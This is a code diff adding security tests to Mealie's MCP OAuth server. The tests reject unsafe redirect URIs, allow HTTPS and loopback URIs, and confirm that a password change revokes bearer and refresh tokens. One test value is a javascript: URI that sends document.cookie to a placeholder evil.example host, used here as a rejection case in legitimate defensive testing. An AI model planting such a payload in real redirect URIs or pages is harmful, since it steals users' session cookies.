@@ -2,13 +2,18 @@ import base64
 import hashlib
 import json
 import secrets
+from datetime import timedelta
 from urllib.parse import parse_qs, urlparse
 
 import pytest
 from fastapi.testclient import TestClient
+from sqlalchemy import update
+from sqlalchemy.orm import Session
 
 from mealie.core.config import get_app_settings
-from tests.integration_tests.mcp.conftest import mcp_call, mcp_initialize
+from mealie.db.models._model_utils.datetime import get_utc_now
+from mealie.db.models.users.users import User
+from tests.integration_tests.mcp.conftest import MCP_HEADERS, mcp_call, mcp_initialize
 from tests.utils import api_routes
 from tests.utils.fixture_schemas import TestUser
 
@@ -23,17 +28,18 @@ def _query(url: str) -> dict[str, str]:
     return {k: v[0] for k, v in parse_qs(urlparse(url).query).items()}
 
 
+def _registration(redirect_uri: str = CALLBACK) -> dict:
+    return {
+        "client_name": "Claude",
+        "redirect_uris": [redirect_uri],
+        "grant_types": ["authorization_code", "refresh_token"],
+        "response_types": ["code"],
+        "token_endpoint_auth_method": "none",
+    }
+
+
 def _register(client: TestClient) -> dict:
-    response = client.post(
-        "/register",
-        json={
-            "client_name": "Claude",
-            "redirect_uris": [CALLBACK],
-            "grant_types": ["authorization_code", "refresh_token"],
-            "response_types": ["code"],
-            "token_endpoint_auth_method": "none",
-        },
-    )
+    response = client.post("/register", json=_registration())
     assert response.status_code == 201, response.text
     return response.json()
 
@@ -190,3 +196,50 @@ def test_register_rate_limited(mcp_client: TestClient):
 def test_rate_limit_ignores_other_paths(mcp_client: TestClient):
     for _ in range(35):
         assert mcp_client.get("/.well-known/oauth-authorization-server").status_code == 200
+
+
+@pytest.mark.parametrize(
+    "redirect_uri",
+    ["javascript:fetch('//evil.example/?'+document.cookie)//", "data:text/html,hi", "http://evil.example/cb"],
+)
+def test_register_rejects_unsafe_redirect_uri(mcp_client: TestClient, redirect_uri: str):
+    response = mcp_client.post("/register", json=_registration(redirect_uri))
+
+    assert response.status_code == 400, response.text
+    assert response.json()["error"] == "invalid_redirect_uri"
+
+
+@pytest.mark.parametrize("redirect_uri", [CALLBACK, "http://127.0.0.1:1234/cb"])
+def test_register_accepts_https_and_loopback(mcp_client: TestClient, redirect_uri: str):
+    response = mcp_client.post("/register", json=_registration(redirect_uri))
+
+    assert response.status_code == 201, response.text
+
+
+def test_password_change_cuts_off_mcp_grant(mcp_client: TestClient, unique_user_fn_scoped: TestUser, session: Session):
+    user = unique_user_fn_scoped
+    client_info = _register(mcp_client)
+    verifier = secrets.token_urlsafe(48)
+    code = _authorize_code(mcp_client, user, client_info["client_id"], verifier)
+    token = mcp_client.post("/token", data=_token_form(client_info, code, verifier)).json()
+    bearer = {"Authorization": f"Bearer {token['access_token']}"}
+    mcp_initialize(mcp_client, bearer)
+
+    # what update_password does (stamped one second ahead so the grant is unambiguously older)
+    session.execute(
+        update(User).where(User.id == user.user_id).values(tokens_valid_after=get_utc_now() + timedelta(seconds=1))
+    )
+    session.commit()
+
+    ping = {"jsonrpc": "2.0", "id": 1, "method": "ping"}
+    assert mcp_client.post("/mcp", json=ping, headers={**MCP_HEADERS, **bearer}).status_code == 401
+    response = mcp_client.post(
+        "/token",
+        data={
+            "grant_type": "refresh_token",
+            "refresh_token": token["refresh_token"],
+            "client_id": client_info["client_id"],
+        },
+    )
+    assert response.status_code == 400, response.text
+    assert response.json()["error"] == "invalid_grant"
